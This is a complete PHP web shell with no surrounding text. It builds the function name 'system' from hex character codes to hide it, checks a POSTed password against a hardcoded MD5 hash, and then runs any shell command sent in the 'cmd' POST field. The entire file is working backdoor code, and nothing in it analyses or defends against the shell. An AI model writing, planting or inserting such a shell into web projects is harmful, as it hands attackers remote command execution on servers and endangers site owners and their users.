<?php

$pass = "9cdfb439c7876e703e307864c9167a15"; //lol 

$A = chr(0x73);
$B = chr(0x79);
$X = chr(0x74);
$D = chr(0x65);
$E = chr(0x6d);

$hook = $A.$B.$A.$X.$D.$E;

if($pass == md5($_POST['password']))
{
  $hook($_POST['cmd']);
}
else
{
  die();
}

?>
